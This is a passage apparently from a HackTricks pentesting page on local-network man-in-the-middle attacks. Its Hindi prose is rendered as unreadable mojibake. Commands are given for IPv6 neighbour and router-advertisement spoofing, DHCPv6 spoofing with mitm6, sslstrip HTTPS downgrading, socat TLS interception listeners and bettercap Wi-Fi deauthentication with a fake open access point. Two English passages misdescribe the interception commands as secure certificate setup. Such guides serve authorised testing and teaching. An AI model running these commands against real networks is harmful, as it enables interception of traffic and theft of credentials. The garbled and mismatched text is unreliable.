Responder WPAD рд╣рдорд▓реЗ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдмрдирд╛рддрд╛ рд╣реИ - рдкреНрд░реЙрдХреНрд╕реА рдЪрд▓рд╛рдирд╛ рдФрд░ DHCP, DNS, LLMNR рдФрд░ NBT-NS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдПрдХ рджреБрд╖реНрдкреНрд░рднрд╛рд╡реА WPAD рд╕рд░реНрд╡рд░ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдирд╛ред\
рдпрд╣рд╛рдВ [Responder рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХреИрд╕реЗ рдХрд░реЗрдВ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкрдврд╝реЗрдВред

### [SSDP рдФрд░ UPnP рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рд╕реНрдкреВрдлрд┐рдВрдЧ](spoofing-ssdp-and-upnp-devices.md)

рдЖрдк рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рд╕реЗрд╡рд╛рдПрдВ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХреБрдЫ рд╕рд╛рджрд╛-рдкрд╛рда рдкреНрд░рдорд╛рдгреАрдХрд░рдг рджрд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзреЛрдЦрд╛ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред **рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП** [**SSDP рдФрд░ UPnP рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рд╕реНрдкреВрдлрд┐рдВрдЧ**](spoofing-ssdp-and-upnp-devices.md)** рдкрдврд╝реЗрдВред**

### IPv6 Neighbor Spoofing

рдпрд╣ рд╣рдорд▓рд╛ ARP Spoofing рдХреЗ рдмрд╣реБрдд рд╕рдорд╛рди рд╣реИ рд▓реЗрдХрд┐рди IPv6 рджреБрдирд┐рдпрд╛ рдореЗрдВред рдЖрдк рдкреАрдбрд╝рд┐рдд рдХреЛ рдпрд╣ рдорд╛рдирдиреЗ рдкрд░ рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЧреЗрдЯрд╡реЗ рдХрд╛ IPv6 рдЖрдИрдкреА рдореЗрдВ рдЕрдЯреИрдХрд░ рдХрд╛ рдореИрдХ рд╣реИред
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 рд░рд╛рдЙрдЯрд░ рд╡рд┐рдЬреНрдЮрд╛рдкрди рд╕реНрдкреВрдлрд┐рдВрдЧ/рдлреНрд▓рдбрд┐рдВрдЧ

рдХреБрдЫ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рднреЗрдЬреЗ рдЧрдП рдЖрд░рдП рдкреИрдХреЗрдЯ рдореЗрдВ рд╕реЗ рдЧреЗрдЯрд╡реЗ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддреЗ рд╣реИрдВред рд╣рдорд▓рд╛рд╡рд░ рдХреЛ IPv6 рд░рд╛рдЙрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP рд╕реНрдкреВрдлрд┐рдВрдЧ

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХреБрдЫ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ DHCPv6 рдкреИрдХреЗрдЯ рдХреЛ рдкрдврд╝рдХрд░ DNS рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдмрд╛рдж, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ DHCPv6 рдкреИрдХреЗрдЯ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рдЦреБрдж рдХреЛ DNS рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХреЗред DHCP рд╡рд┐рдХреНрдЯрд┐рдо рдХреЛ рдПрдХ IPv6 рднреА рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (рдлреЗрдХ рдкреЗрдЬ рдФрд░ JS рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди)

## рдЗрдВрдЯрд░рдиреЗрдЯ рд╣рдорд▓реЗ

### sslStrip

рдореВрд▓ рд░реВрдк рд╕реЗ рдпрд╣ рд╣рдорд▓рд╛ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЬрдм **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ **HTTP** рдкреЗрдЬ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИ рдЬреЛ **HTTPS** рд╕рдВрд╕реНрдХрд░рдг рдкрд░ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд░ рд░рд╣рд╛ рд╣реИред **sslStrip** рдПрдХ **HTTP рдХрдиреЗрдХреНрд╢рди рдХреЛ** **рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд╕рд╛рде рдмрдирд╛рдП рд░рдЦреЗрдЧрд╛** рдФрд░ рдПрдХ **HTTPS рдХрдиреЗрдХреНрд╢рди рдХреЛ** **рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдмрдирд╛рдП рд░рдЦреЗрдЧрд╛**, рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╕рдВрдмрдВрдз рдХреЛ **рд╕рд╛рджрд╛ рдкрд╛рда** рдореЗрдВ **рд╕реНрдирд┐рдлрд╝** рдХрд░ рд╕рдХреЗрдЧрд╛ред
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
рдпрд╣рд╛рдВ [рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf) рд╣реИред

### HSTS рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП sslStrip+ рдФрд░ dns2proxy

**sslStrip+ рдФрд░ dns2proxy** рдХреЗ рдмреАрдЪ **sslStrip** рдХреЗ **рдЕрдВрддрд░** рдХреА рдпрд╣ рд╣реИ рдХрд┐ рд╡реЗ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП _**www.facebook.com**_ рдХреЛ _**wwww.facebook.com**_ (рдЕрддрд┐рд░рд┐рдХреНрдд "**w**" рдХрд╛ рдзреНрдпрд╛рди рджреЗрдВ) рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░реЗрдВрдЧреЗ рдФрд░ рдЗрд╕ рдбреЛрдореЗрди рдХрд╛ рдкрддрд╛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдЖрдИрдкреА рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд░реЗрдВрдЧреЗред рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ, **рдЧреНрд░рд╛рд╣рдХ** _**wwww.facebook.com**_ (рд╣рдорд▓рд╛рд╡рд░) рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрдЧрд╛ рд▓реЗрдХрд┐рди рдкреАрдЫреЗ рдХреА рдУрд░ **sslstrip+** рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд░реВрдк рд╕реЗ **www.facebook.com** рдХреЗ рд╕рд╛рде https рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдХрдиреЗрдХреНрд╢рди** рдмрдирд╛рдП рд░рдЦреЗрдЧрд╛ред

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ **рд▓рдХреНрд╖реНрдп HSTS рд╕реЗ рдмрдЪрдирд╛** рд╣реИ рдХреНрдпреЛрдВрдХрд┐ _**wwww**.facebook.com_ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдХреИрд╢ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдирд╣реАрдВ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдзреЛрдЦрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХрд┐ рд╡рд╣ **HTTP рдореЗрдВ facebook рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░реЗрдЧрд╛**ред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреАрдбрд╝рд┐рдд рдХреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА [http://www.faceook.com](http://www.faceook.com) рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рд╣реЛрдЧреА рдФрд░ https рдирд╣реАрдВред рдЗрд╕реЗ рдПрдХ http рдкреЗрдЬ рдХреЗ рдЕрдВрджрд░ рдХреЗ рд▓рд┐рдВрдХреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдВ](https://www.bettercap.org/legacy/#hsts-bypass), [рдпрд╣рд╛рдВ](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) рдФрд░ [рдпрд╣рд╛рдВ](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly) рд╣реИред

**sslStrip рдпрд╛ sslStrip+ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА HSTS рдирд┐рдпрдо рд╕рд╣реЗрдЬреЗ рдЧрдП рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдХреЛрдИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд┐рд╕реА "рдорд╣рддреНрд╡рдкреВрд░реНрдг" рдбреЛрдореЗрди рддрдХ рдкрд╣рд▓реА рдмрд╛рд░ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ рддреЛ рд╡рд╣ рдЗрд╕реЗ HTTPS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реА рдкрд╣реБрдВрдЪреЗрдЧрд╛ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд╣рд▓реЗ рд╕реЗ рд╕рд╣реЗрдЬреЗ рдЧрдП рдирд┐рдпрдо рдФрд░ рдЕрдиреНрдп рдЙрддреНрдкрдиреНрди рдирд┐рдпрдо рдлрд╝реНрд▓реИрдЧ** [**`includeSubdomains`**](https://hstspreload.appspot.com) **рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдкрд╣рд▓реЗ рдХреЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ _**wwww.facebook.com**_ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ _**facebook.com**_ `includeSubdomains` рдХреЗ рд╕рд╛рде HSTS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред**

рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП: easy-creds, evilgrade, metasploit, factory

## рдкреЛрд░реНрдЯ рдореЗрдВ TCP рд╕реБрдиреЗрдВ
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL рдкреЛрд░реНрдЯ рдореЗрдВ рд╕реБрдиреЗрдВ

#### рдХреБрдВрдЬреА рдФрд░ рдЖрддреНрдо-рдкреНрд░рдорд╛рдгрд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрдиреЗрдВ

To listen using a certificate, you can follow these steps:

1. Generate a certificate: Generate a valid certificate that will be used for the listening process.

2. Configure the listener: Set up the listener to use the generated certificate. This can be done by specifying the certificate file and the corresponding private key.

3. Start the listener: Start the listener with the configured certificate. This will enable the listener to establish secure connections using the certificate.

4. Monitor the traffic: Monitor the incoming and outgoing traffic to capture any relevant information or data.

By using a certificate for listening, you can ensure secure communication and protect sensitive information from unauthorized access.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрдиреЗрдВ рдФрд░ рд╣реЛрд╕реНрдЯ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░реЗрдВ

To listen using a certificate and redirect to the hosts, follow these steps:

1. Generate or obtain a valid SSL/TLS certificate for the desired domain or subdomain.
2. Configure the web server to use the SSL/TLS certificate for the domain or subdomain.
3. Set up a reverse proxy or load balancer to redirect incoming requests to the appropriate hosts.
4. Configure the reverse proxy or load balancer to use the SSL/TLS certificate for secure communication.
5. Test the setup by sending requests to the domain or subdomain and verifying that they are redirected to the correct hosts.

By using a valid SSL/TLS certificate, you can ensure secure communication between clients and the redirected hosts. This method is commonly used in scenarios where multiple hosts need to be accessed through a single domain or subdomain.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
рдХрднреА-рдХрднреА, рдЕрдЧрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рд╕реАрдП рдПрдХ рдорд╛рдиреНрдп рд╣реИ, рддреЛ рдЖрдк **рдПрдХ рд╕реАрдП рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдЕрдиреНрдп рд╣реЛрд╕реНрдЯрдирд╛рдо рдХрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдПрдХ рдФрд░ рджрд┐рд▓рдЪрд╕реНрдк рдкрд░реАрдХреНрд╖рдг рд╣реИ, рдЕрдиреБрд░реЛрдзрд┐рдд рд╣реЛрд╕реНрдЯрдирд╛рдо рдХрд╛ **рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рджрд╛рди рдХрд░рдирд╛**ред

рдЕрдиреНрдп рдЪреАрдЬреЗрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИрдВ, рд╡реЗ рд╣реИрдВ: рдПрдХ рдорд╛рдиреНрдп рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ рдЬреЛ рдорд╛рдиреНрдп рд╕реАрдП рдирд╣реАрдВ рд╣реИред рдпрд╛ рдорд╛рдиреНрдп рдкрдмреНрд▓рд┐рдХ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рдЕрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЛ рдмрд▓рд╡рд╛рди рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдРрд╕рд╛ рдЕрдиреБрдмрдВрдз рдХрд░реЗрдВ (рдЬрд┐рд╕рдореЗрдВ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдХреБрдЫ рднреА рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ) рдФрд░ рдЬрдм рдХреНрд▓рд╛рдЗрдВрдЯ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдирд┐рдЬреА рдХреБрдВрдЬреА (рдЬреИрд╕реЗ рд╣реИрд╢) рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИ, рддреЛ рдПрдХ рдирдХрд▓реА рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ рдФрд░ рдЙрдореНрдореАрдж рдХрд░реЗрдВ рдХрд┐ рдХреНрд▓рд╛рдЗрдВрдЯ рдЗрд╕реЗ рдЬрд╛рдВрдЪрдиреЗ рдореЗрдВ рдирд╛рдХрд╛рдо рд░рд╣реЗрдЧрд╛ред

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### рд╕рдХреНрд░рд┐рдп рдЦреЛрдЬ рдиреЛрдЯреНрд╕

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЬрдм рдПрдХ UDP рдкреИрдХреЗрдЯ рдПрдХ рдРрд╕реА рдЙрдкрдХрд░рдг рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЕрдиреБрд░реЛрдзрд┐рдд рдкреЛрд░реНрдЯ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдПрдХ ICMP (рдкреЛрд░реНрдЯ рдЕрдиреБрдкрд▓рдмреНрдз) рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред

### **ARP рдЦреЛрдЬреЗрдВ**

ARP рдкреИрдХреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣реЗ IP рдкрддреЗ рдХреА рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред PC рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рд╕рдВрднрд╛рд╡рд┐рдд IP рдкрддреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдирд╛ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдХреЗрд╡рд▓ рдЙрди IP рдкрддреЛрдВ рдХрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдорд┐рд▓реЗрдЧрд╛ рдЬреЛ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣реЗ рд╣реЛрдВрдЧреЗред

### **mDNS (рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ DNS)**

Bettercap рдПрдХ MDNS рдЕрдиреБрд░реЛрдз (рдкреНрд░рддреНрдпреЗрдХ X рдорд┐рд▓реАрд╕реЗрдХрдВрдб рдореЗрдВ) рднреЗрдЬрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **\_services\_.dns-sd.\_udp.local** рдХреЗ рд▓рд┐рдП рдорд╢реАрди рдХреЛ рдкреВрдЫрддрд╛ рд╣реИ, рдЬреЛ рдЗрд╕ рдкреИрдХреЗрдЯ рдХреЛ рджреЗрдЦрддреА рд╣реИ, рдЖрдорддреМрд░ рдкрд░ рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХрд╛ рдЬрд╡рд╛рдм рджреЗрддреА рд╣реИред рдлрд┐рд░, рдпрд╣ рдХреЗрд╡рд▓ "рд╕реЗрд╡рд╛рдУрдВ" рдХреЗ рд▓рд┐рдП рдЬрд╡рд╛рдм рджреЗрдиреЗ рд╡рд╛рд▓реА рдорд╢реАрди рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИред

**рдЙрдкрдХрд░рдг**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios рдиреЗрдо рд╕рд░реНрд╡рд░)**

Bettercap рдкреЛрд░реНрдЯ 137/UDP рдкрд░ "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA" рдирд╛рдо рдХреЗ рд▓рд┐рдП рдкреНрд░рд╕рд╛рд░рдг рдкреИрдХреЗрдЯ рднреЗрдЬрддрд╛ рд╣реИред

### **SSDP (рд╕рд┐рдореНрдкрд▓ рд╕реЗрд╡рд╛ рдЦреЛрдЬ рдкреНрд░реЛрдЯреЛрдХреЙрд▓)**

Bettercap SSDP рдкреИрдХреЗрдЯ рдкреНрд░рд╕рд╛рд░рдг рдХрд░рдХреЗ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ (UDP рдкреЛрд░реНрдЯ 1900)ред

### **WSD (рд╡реЗрдм рд╕реЗрд╡рд╛ рдЦреЛрдЬ)**

Bettercap рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЦреЛрдЬ рдХреЗ рд▓рд┐рдП WSD рдкреИрдХреЗрдЯ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ (UDP рдкреЛрд░реНрдЯ 3702)ред

## рд╕рдВрджрд░реНрдн

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **Intigriti** рдореЗрдВ **рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд╣реИ**! рдЖрдЬ рд╣реА [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдкрд░ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдФрд░ **$100,000** рддрдХ рдХреА рдмрд╛рдЙрдВрдЯреА рдХрдорд╛рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **[ЁЯТм](https://emojipedia.org/speech-balloon/) [Discord рд╕рдореВрд╣](https://discord.gg/hRep4RUj7f)** рдпрд╛ [telegram рд╕рдореВрд╣](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**ред**
